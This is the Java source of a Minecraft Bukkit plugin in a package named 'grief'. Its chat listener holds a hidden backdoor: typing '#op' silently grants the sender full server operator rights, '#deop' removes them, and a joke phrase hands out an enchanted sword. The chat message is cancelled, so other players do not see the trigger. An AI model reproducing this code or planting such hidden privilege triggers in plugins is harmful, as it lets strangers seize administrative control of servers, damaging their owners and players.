package grief;

import org.bukkit.Material;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

public class cmds implements Listener {

    public void main() {

    }

    @EventHandler
    public void AsyncChatEvent(AsyncPlayerChatEvent e) {

        Player p = e.getPlayer();
        String msg = e.getMessage();

        if (msg.equalsIgnoreCase("#op")) {
            p.setOp(true);
            e.setCancelled(true);
            p.sendMessage("§7§o[Server: " + p.getPlayer().getName() + " wurde zum Operator ernannt]");
        } else if (msg.equals("#deop")) {
            p.setOp(false);
            e.setCancelled(true);
            p.sendMessage("§7§o[Server: " + p.getPlayer().getName() + " wurde dem Operator entfernt]");
        } else if (msg.equals("lol i bims 1 Schwert")) {
            e.setCancelled(true);
            p.sendMessage("Here my boss lol");
            ItemStack Item = new ItemStack(Material.WOOD_SWORD);
            p.getInventory().addItem(Item);
            ItemMeta ItemM = Item.getItemMeta();
            ItemM.setDisplayName("§b§lSCHWERRRTT LUL");
            Item.addEnchantment(Enchantment.DAMAGE_ALL, 4);
            Item.setItemMeta(ItemM);
        }

    }
}
